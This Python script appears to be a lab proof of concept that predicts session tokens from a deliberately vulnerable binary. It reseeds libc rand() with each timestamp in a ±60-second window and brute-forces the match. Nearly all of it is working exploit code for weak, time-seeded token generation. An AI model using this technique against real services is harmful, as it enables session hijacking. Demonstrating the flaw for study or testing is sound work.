#!/usr/bin/env python3
"""Tier-1 PRNG / C — predict the token from approximate timestamp.

Re-implements rand() with the same seed (current epoch) and
demonstrates a high-probability match against the binary's emitted
token. With ±60s clock skew window, an attacker brute-forces ~120
seeds and recovers the token.
"""
import os
import subprocess
import sys
import time
import ctypes
import re


def predict_tokens(window_secs: int = 60):
    """Use libc.rand() with srand(t) for t in window around now."""
    libc = ctypes.CDLL("libc.so.6") if os.name != "nt" else ctypes.CDLL("msvcrt.dll")
    libc.srand.argtypes = [ctypes.c_uint]
    libc.rand.restype = ctypes.c_int
    now = int(time.time())
    chars = b"0123456789abcdef"
    for t in range(now - window_secs, now + window_secs + 1):
        libc.srand(ctypes.c_uint(t))
        token = bytes(chars[libc.rand() & 0xF] for _ in range(32)).decode()
        yield t, token


def main() -> int:
    binary = sys.argv[1] if len(sys.argv) > 1 else os.path.join("build", "vuln")
    proc = subprocess.run([binary], capture_output=True, timeout=5)
    out = proc.stdout.decode(errors="replace")
    m = re.search(r"session=([0-9a-f]+)", out)
    if not m:
        print(f"no token in output: {out!r}")
        return 1
    actual = m.group(1)
    print(f"actual={actual}")
    for t, predicted in predict_tokens(window_secs=60):
        if predicted == actual:
            print(f"matched at seed t={t}")
            return 0
    print("no match within window — increase window or check libc.rand semantics")
    return 1


if __name__ == "__main__":
    sys.exit(main())
